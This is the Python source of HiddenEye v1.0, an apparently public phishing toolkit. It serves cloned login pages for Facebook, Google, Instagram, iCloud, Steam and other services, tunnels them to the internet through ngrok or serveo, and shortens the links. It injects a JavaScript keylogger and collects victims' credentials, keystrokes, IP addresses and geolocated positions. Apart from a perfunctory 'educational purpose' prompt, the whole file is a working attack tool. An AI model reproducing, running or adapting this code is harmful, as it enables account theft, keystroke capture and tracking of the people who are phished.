#!/usr/bin/python3
#-*- coding: utf-8 -*-
#    HiddenEye v1.0
#    By:- DARKSEC TEAM
#
###########################
from time import sleep
from sys import stdout, exit, argv
from os import system, path
from distutils.dir_util import copy_tree
import multiprocessing
from urllib.request import urlopen, quote, unquote
from platform import system as systemos, architecture
from wget import download
import re
import json
from subprocess import check_output


RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'

def connected(host='http://duckduckgo.com'): #Checking network connection.
    try:
        urlopen(host)
        return True
    except:
        return False
if connected() == False: #If there no network
     print ('''{0}[{1}!{0}]{1} Network error. Verify your Internet connection.\n
'''.format(RED, DEFAULT))
     exit(0)

def checkNgrok(): #Check if user already have Ngrok server, if False - downloading it.
    if path.isfile('Server/ngrok') == False:
        print('[*] Downloading Ngrok...')
        if 'Android' in str(check_output(('uname', '-a'))):
            filename = 'ngrok-stable-linux-arm.zip'
        else:
            ostype = systemos().lower()
            if architecture()[0] == '64bit':
                filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
            else:
                filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('mv ngrok Server/ngrok')
        system('rm -Rf ' + filename)
        system('clear')
checkNgrok()

def end(): #Message when HiddenEye exit
    system('clear')
    print ('''{1} THANK YOU FOR USING HIDDENEYE! JOIN DARKSEC TEAM NOW (github.com/DarkSecDevelopers). 
    WAITING FOR YOUR CONTRIBUTION. GOOD BYE ! {1}'''.format(RED, DEFAULT, CYAN))

def loadModule(module):
       print ('''{0}[{1}*{0}]{1} %s Loading module..{0}'''.format(CYAN, DEFAULT) % module)

def runPhishing(page, option2): #Phishing pages selection menu
    system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/')
    if option2 == '1' and page == 'Facebook':
        copy_tree("WebPages/fb_standard/", "Server/www/")
    if option2 == '2' and page == 'Facebook':
        copy_tree("WebPages/fb_advanced_poll/", "Server/www/")
    if option2 == '3' and page == 'Facebook':
        copy_tree("WebPages/fb_security_fake/", "Server/www/")
    if option2 == '4' and page == 'Facebook':
        copy_tree("WebPages/fb_messenger/", "Server/www/")
    elif option2 == '1' and page == 'Google':
        copy_tree("WebPages/google_standard/", "Server/www/")
    elif option2 == '2' and page == 'Google':
        copy_tree("WebPages/google_advanced_poll/", "Server/www/")
    elif option2 == '3' and page == 'Google':
        copy_tree("WebPages/google_advanced_web/", "Server/www/")
    elif page == 'LinkedIn':
        copy_tree("WebPages/linkedin/", "Server/www/")
    elif page == 'GitHub':
        copy_tree("WebPages/GitHub/", "Server/www/")
    elif page == 'StackOverflow':
        copy_tree("WebPages/stackoverflow/", "Server/www/")
    elif page == 'WordPress':
        copy_tree("WebPages/wordpress/", "Server/www/")
    elif page == 'Twitter':
        copy_tree("WebPages/twitter/", "Server/www/")
    elif page == 'Snapchat':
        copy_tree("WebPages/Snapchat_web/", "Server/www/")
    elif page == 'Yahoo':
        copy_tree("WebPages/yahoo_web/", "Server/www/")
    elif page == 'Twitch':
        copy_tree("WebPages/twitch/", "Server/www/")
    elif page == 'Microsoft':
        copy_tree("WebPages/live_web/", "Server/www/")
    elif page == 'Steam':
        copy_tree("WebPages/steam/", "Server/www/")
    elif page == 'iCloud':
        copy_tree("WebPages/iCloud/", "Server/www/")
    elif option2 == '1' and page == 'Instagram':
        copy_tree("WebPages/Instagram_web/", "Server/www/")
    elif option2 == '2' and page == 'Instagram':
        copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
    elif option2 == '1' and page == 'VK':
        copy_tree("WebPages/VK/", "Server/www/")
    elif option2 == '2' and page == 'VK':
        copy_tree("WebPages/VK_poll_method/", "Server/www/")


didBackground = True
logFile = None
for arg in argv:
    if arg=="--nolog": #If true - don't log
        didBackground = False
if didBackground:
    logFile = open("log.txt", "w")


def log(ctx): #Writing log
    if didBackground: #if didBackground == True, write
        logFile.write(ctx.replace(RED, "").replace(WHITE, "").replace(CYAN, "").replace(GREEN, "").replace(DEFAULT, "") + "\n")
    print(ctx)


def waitCreds():
    print("{0}[{1}*{0}]{1} Looks Like Everything is Ready. Now Feel The Power.".format(CYAN, DEFAULT))
    print("{0}[{1}*{0}]{1} KEEP EYE ON HIDDEN WORLD WITH DARKSEC.".format(RED, DEFAULT))
    print("{0}[{1}*{0}]{1} Waiting for credentials//Keystrokes//Victim's device info. \n".format(CYAN, DEFAULT))
    while True:
        with open('Server/www/usernames.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log('======================================================================'.format(RED, DEFAULT))
                log(' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
                log('======================================================================'.format(RED, DEFAULT))
                log(' {0}***** I KNOW YOU ARE ENJOYING. SO MAKE IT POPULAR TO GET MORE FEATURES *****{1}\n {0}{1}'.format(RED, DEFAULT))

        creds.close()


        with open('Server/www/ip.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
                resp = urlopen('https://ipinfo.io/%s/json' % ip)
                ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                if 'bogon' in ipinfo:
                    log('======================================================================'.format(RED, DEFAULT))
                    log(' \n{0}[ VICTIM IP BONUS ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                else:
                    matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                    latitude = matchObj.group(1)
                    longitude = matchObj.group(2)
                    log('======================================================================'.format(RED, DEFAULT))
                    log(' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                    log(' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, DEFAULT) % (longitude, latitude))
                    log(' \n{0}ISP: %s \nCountry: %s{1}'.format(GREEN, DEFAULT) % (ipinfo['org'], ipinfo['country']))
                    log(' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, DEFAULT) % (ipinfo['region'], ipinfo['city']))
                system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
                log('======================================================================'.format(RED, DEFAULT))

        creds.close()

        with open('Server/www/KeyloggerData.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log('______________________________________________________________________'.format(RED, DEFAULT))
                log(' {0}[KEY PRESSED ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                system('rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
                log('______________________________________________________________________'.format(RED, DEFAULT))


        creds.close()


def runPEnv(): #menu where user select what they wanna use
    system('clear')
    print ('''
  _________________________________________________________________________________  
            ------>{2} HIDDEN EYE {2}<-------
         {0}KEEP EYE ON HIDDEN WORLD WITH DARKSEC.
 
          {0}[ LIVE VICTIM  ATTACK INFORMATION ]
          {0}[ LIVE KEYSTROKES CAN BE CAPTURED ]
 _________________________________________________________________________________
                             {1}'''.format(GREEN, DEFAULT, CYAN))
    
    
    if 256 != system('which php'): #Checking if user have PHP
        print (" PHP INSTALLATION FOUND".format(CYAN, DEFAULT))
       
    else:
        print (" --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run HiddenEye again.http://www.php.net/".format(RED, DEFAULT))
        exit(0)
        
    for i in range(101):
        sleep(0.05)
        stdout.write("\r{0}[{1}*{0}]{1} Eye is Opening. Please Wait... %d%%".format(CYAN, DEFAULT) % i)
        stdout.flush() 
        
        
           
    if input(" \n\n{0}[{1}!{0}]{1} DO YOU AGREE TO USE THIS TOOL FOR EDUCATIONAL PURPOSE ?  (y/n)\n\n{2}[HIDDENEYE-DARKSEC]- > {1}".format(RED, DEFAULT, CYAN)).upper() != 'Y': #Question where user must accept education purposes
        system('clear')
        print ('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE. GOOD BYE!{1} ]\n\n'.format(RED, DEFAULT))
        exit(0)    
   
    option = input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n{0}[HIDDENEYE-DARKSEC]- >  {1}".format(CYAN, DEFAULT))
    if option == '1':
        loadModule('Facebook')
        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
        runPhishing('Facebook', option2)
    elif option == '2':
        loadModule('Google')
        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
        runPhishing('Google', option2)
    elif option == '3':
        loadModule('LinkedIn')
        option2 = ''
        runPhishing('LinkedIn', option2)
    elif option == '4':
        loadModule('GitHub')
        option2 = ''
        runPhishing('GitHub', option2)
    elif option == '5':
        loadModule('StackOverflow')
        option2 = ''
        runPhishing('StackOverflow', option2)
    elif option == '6':
        loadModule('WordPress')
        option2 = ''
        runPhishing('WordPress', option2)
    elif option == '7':
        loadModule('Twitter')
        option2 = ''
        runPhishing('Twitter', option2)
    elif option == '8':
        loadModule('Instagram')
        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
        runPhishing('Instagram', option2)
    elif option == '9':
        loadModule('Snapchat')
        option2 = ''
        runPhishing('Snapchat', option2)
    elif option == '10':
        loadModule('Yahoo')
        option2 = ''
        runPhishing('Yahoo', option2)
    elif option == '11':
        loadModule('Twitch')
        option2 = ''
        runPhishing('Twitch', option2)
    elif option == '12':
        loadModule('Microsoft')
        option2 = ''
        runPhishing('Microsoft', option2)
    elif option == '13':
        loadModule('Steam')
        option2 = ''
        runPhishing('Steam', option2)
    elif option == '14':
        loadModule('VK')
        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
        runPhishing('VK', option2)
    elif option == '15':
        loadModule('iCloud')
        option2 = ''
        runPhishing('iCloud', option2)
    else:
        
        system('clear && ./HiddenEye.py')
    
         
    


def runServeo():
    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > link.url 2> /dev/null &')
    sleep(7)
    output = check_output("grep -o 'https://[0-9a-z]*\.serveo.net' link.url", shell=True)
    url = str(output).strip("b ' \ n")
    print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(CYAN, DEFAULT, GREEN) + url + "{1}".format(CYAN, DEFAULT, GREEN))
    link = check_output("curl -s 'http://tinyurl.com/api-create.php?url='"+url, shell=True).decode().replace('http', 'https')
    print("\n {0}[{1}*{0}]{1} TINYURL: {2}".format(CYAN, DEFAULT, GREEN) + link + "{1}".format(CYAN, DEFAULT, GREEN))
    print("\n")

def runNgrok():
    system('./Server/ngrok http 1111 > /dev/null &')
    while True:
        sleep(2)
        system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
        urlFile = open('ngrok.url', 'r')
        url = urlFile.read()
        urlFile.close()
        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
            print("\n {0}[{1}*{0}]{1} Ngrok URL: {2}".format(CYAN, DEFAULT, GREEN) + url + "{1}".format(CYAN, DEFAULT, GREEN))
            link = check_output("curl -s 'http://tinyurl.com/api-create.php?url='"+url, shell=True).decode().replace('http', 'https')
            print("\n {0}[{1}*{0}]{1} TINYURL: {2}".format(CYAN, DEFAULT, GREEN) + link + "{1}".format(CYAN, DEFAULT, GREEN))
            print("\n")
            break


def runServer():
    system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")

if __name__ == "__main__":
    try:
        runPEnv()
        def custom(): #Question where user can input custom web-link
            print("\n {0}Insert a custom redirect url:".format(CYAN, DEFAULT))
            custom = input("\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
            if 'https://' in custom:
                pass
            else:
                custom = 'https://' + custom
            if path.exists('Server/www/post.php') and path.exists('Server/www/login.php'):
                with open('Server/www/login.php') as f:
                    read_data = f.read()
                c = read_data.replace('<CUSTOM>', custom)
                f = open('Server/www/login.php', 'w')
                f.write(c)
                f.close()
                with open('Server/www/post.php') as f:
                    read_data = f.read()
                c = read_data.replace('<CUSTOM>', custom)
                f = open('Server/www/post.php', 'w')
                f.write(c)
                f.close()
            else:
                with open('Server/www/login.php') as f:
                    read_data = f.read()
                c = read_data.replace('<CUSTOM>', custom)
                f = open('Server/www/login.php', 'w')
                f.write(c)
                f.close()
        custom()
        def server(): #Question where user must select server
                print("\n {0}Please select any available server:{1}".format(CYAN, DEFAULT))
                print("\n {0}[{1}1{0}]{1} Ngrok\n {0}[{1}2{0}]{1} Serveo".format(CYAN, DEFAULT))
                choice = input(" \n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
                if choice == '1':
                    runNgrok()
                elif choice == '2':
                    runServeo()
                else:
                    system('clear')
                    return server()
        server()
        multiprocessing.Process(target=runServer).start()
        waitCreds()

    except KeyboardInterrupt:
        end()
        exit(0)
